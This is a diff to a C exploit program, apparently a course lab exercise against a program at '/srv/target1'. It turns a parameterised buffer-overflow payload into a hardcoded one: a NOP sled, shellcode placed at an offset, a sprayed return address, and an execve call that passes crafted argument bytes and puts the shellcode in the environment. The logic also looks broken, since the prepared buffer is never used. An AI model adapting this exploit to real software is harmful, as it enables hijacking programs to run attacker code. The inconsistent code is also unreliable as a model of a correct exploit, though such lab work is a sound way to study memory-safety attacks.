@@ -7,32 +7,34 @@
 
 #define TARGET "/srv/target1"
 
-int main(int argc, char *argv[])
+#define BUFFER_SIZE 409
+
+int main(void)
 {
-    if (argc != 3) {
-        fprintf(stderr, "Usage: %s <nop_length> <eip_address>\n", argv[0]);
-        return 1;
-    }
+  char *args[4]; 
+  char *env[1];
 
-    int nop_length = atoi(argv[1]);
-    uint32_t eip_address = strtoul(argv[2], NULL, 16);
+  char buf[BUFFER_SIZE];
+  memset(buf, 0x90, sizeof(buf)-1);
+  int offset = 201;
+  memcpy(buf+offset, shellcode, sizeof(shellcode)-1);
 
-    char *args[3];
-    char *env[1];
+  uint32_t return_addr = 0xffffdb5c;
 
-    char payload[1000];
-    memset(payload, 0x90, nop_length);
-    memcpy(payload + nop_length, shellcode, strlen(shellcode));
-    *(uint32_t *)(payload + nop_length + strlen(shellcode) + 44 - 4) = eip_address;
+  for(int i = offset + sizeof(shellcode) - 1; i < BUFFER_SIZE - 1; i += 4) {
+    *(uint32_t *)(buf + i) = return_addr;
+  }
 
-    args[0] = TARGET;
-    args[1] = payload;
-    args[2] = NULL;
+  buf[BUFFER_SIZE-1] = '\0';
+  
+  args[0] = TARGET;
+  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\xe8\xd4\xff\xff";
+  args[2] = "65935";
+  args[3] = NULL;
+  
+  env[0] = shellcode;
+  execve(TARGET, args, env);
+  fprintf(stderr, "execve failed.\n");
 
-    env[0] = NULL;
-
-    execve(TARGET, args, env);
-    fprintf(stderr, "execve failed.\n");
-
-    return 0;
+  return 0;
 }
